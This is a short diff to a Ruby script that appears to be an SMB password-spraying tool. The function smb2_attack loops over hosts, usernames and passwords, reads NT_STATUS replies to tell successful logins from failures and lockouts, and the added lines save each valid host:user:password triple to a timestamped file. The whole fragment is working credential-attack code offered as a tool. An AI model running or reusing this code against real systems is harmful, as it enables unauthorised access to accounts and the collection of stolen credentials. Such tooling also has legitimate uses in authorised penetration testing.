@@ -68,6 +68,7 @@ def command
 end
 
 def smb2_attack(arg)
+  file = "#{Time.now.strftime("%H:%M:%S")}_valid_accounts.txt"
   puts "Attack Started #{Time.now.strftime("%H:%M:%S")}".light_blue
   @hosts.each do |host|
     @users.each do |user|
@@ -77,6 +78,7 @@ def smb2_attack(arg)
             print "[+] #{host} Username: #{user} Password: #{pass} LOGIN FAILED - MESSAGE = #{out.split(":")[1]}"
           elsif out =~ /NT_STATUS_ACCESS_DENIED|NT_STATUS_BAD_NETWORK_NAME|NT_STATUS_PASSWORD_MUST_CHANGE/
             print "[*] #{host} Username: #{user} Password: #{pass} LOGIN SUCCESS - MESSAGE = #{out.split(":")[1]}".green.bold
+            File.open("#{file}", 'a') { |f| f.puts("#{host}:#{user}:#{pass}") }
           elsif out =~ /NT_STATUS_ACCOUNT_LOCKED_OUT/
             puts "[!] #{host} Username: #{user} Password: #{pass} ACCOUNT LOCKED OUT!!!!".red.bold
           else
@@ -86,6 +88,7 @@ def smb2_attack(arg)
     end
   end
   puts "Attack Finished #{Time.now.strftime("%H:%M:%S")}".light_blue
+  puts "Valid Passwords Written to #{file}".light_magenta.bold
 end
 
 arg = arguments
